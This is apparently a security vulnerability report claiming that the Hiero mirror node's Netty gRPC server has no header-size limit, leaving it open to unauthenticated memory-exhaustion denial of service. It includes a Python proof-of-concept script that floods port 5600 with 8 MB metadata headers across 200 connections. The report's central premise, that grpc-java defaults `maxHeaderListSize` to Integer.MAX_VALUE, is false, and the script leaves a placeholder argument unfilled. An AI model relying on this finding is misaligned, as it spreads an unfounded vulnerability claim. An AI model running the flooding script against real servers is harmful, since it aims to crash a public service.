### Title
Missing `maxHeaderListSize` Bound in Netty gRPC Server Enables Unauthenticated Memory-Exhaustion DoS

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server with only a per-connection call limit, leaving no upper bound on inbound HTTP/2 header (metadata) size. Because `NettyServerBuilder` defaults `maxHeaderListSize` to `Integer.MAX_VALUE` when not explicitly set, any unauthenticated caller can send arbitrarily large gRPC metadata headers, forcing the server to buffer them entirely in heap memory. Flooding the server with such requests from many connections exhausts JVM heap and crashes the gRPC service.

### Finding Description
**Code path:**
- `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35
- `grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–15

`grpcServerConfigurer()` applies exactly two settings to the `NettyServerBuilder`:
```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default 5
```
`NettyProperties` exposes only `maxConcurrentCallsPerConnection`; there is no `maxHeaderListSize` field and no call to `serverBuilder.maxHeaderListSize(...)` anywhere in the codebase (confirmed by full-repo grep returning zero matches).

**Root cause:** `NettyServerBuilder` in grpc-java uses `Integer.MAX_VALUE` as the default `maxHeaderListSize` when the caller never invokes `.maxHeaderListSize()`. Netty's HTTP/2 codec buffers the entire HEADERS frame payload in heap memory before handing it to the gRPC layer. With no ceiling, a single frame can be up to ~2 GB; the server allocates that memory unconditionally.

**Why existing checks fail:** `maxConcurrentCallsPerConnection = 5` throttles the number of active RPC streams per TCP connection, but it does not limit the number of simultaneous TCP connections, nor does it constrain the byte size of the HEADERS frame on any individual stream. An attacker opens many connections (no connection-count limit is configured) and sends one oversized HEADERS frame per connection before any call is counted.

### Impact Explanation
The gRPC mirror node service (topic message subscriptions, address book queries, port 5600) is publicly reachable with no authentication. Successful exploitation exhausts JVM heap, triggering an `OutOfMemoryError` that kills the process. All legitimate subscribers lose their streaming connections and cannot reconnect until the service is restarted. Because the attack requires only network access and no credentials, it can be repeated indefinitely to maintain a persistent denial of service.

### Likelihood Explanation
The precondition is solely network reachability to port 5600 — no account, token, or prior knowledge of the API is required. A standard gRPC client library (e.g., grpc-java, grpcurl) can attach arbitrary metadata to any call. Sending a few hundred connections each carrying a multi-megabyte metadata block is trivially scriptable and requires no special hardware. The attack is fully repeatable after each service restart.

### Recommendation
Add an explicit `maxHeaderListSize` call inside `grpcServerConfigurer()` and expose it as a configurable property in `NettyProperties`:

```java
// NettyProperties.java
@Min(1)
private int maxHeaderListSize = 8192; // 8 KB, matches HTTP/2 recommended default

// GrpcConfiguration.java – inside the lambda
serverBuilder.maxHeaderListSize(nettyProperties.getMaxHeaderListSize());
```

Additionally consider adding `maxConnectionAge`, `maxConnectionIdle`, and `maxInboundMessageSize` limits to bound the overall attack surface of the Netty server.

### Proof of Concept
```python
import grpc
import time

# Craft metadata with a single key whose value is 8 MB
large_value = "x" * (8 * 1024 * 1024)
metadata = [("attack-header", large_value)]

# Open many connections simultaneously
channels = []
for _ in range(200):
    ch = grpc.insecure_channel("mirror-node-host:5600")
    channels.append(ch)

# Each channel sends one RPC with the oversized metadata header
# The HEADERS frame is buffered in heap before the call limit is checked
from hiero.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
for ch in channels:
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(ch)
    try:
        stub.subscribeTopic(
            consensus_service_pb2.ConsensusTopicQuery(topic_id=...),
            metadata=metadata,
            timeout=1
        )
    except Exception:
        pass  # OOM crash on server side is the goal

# Expected result: server JVM throws OutOfMemoryError and process exits
```
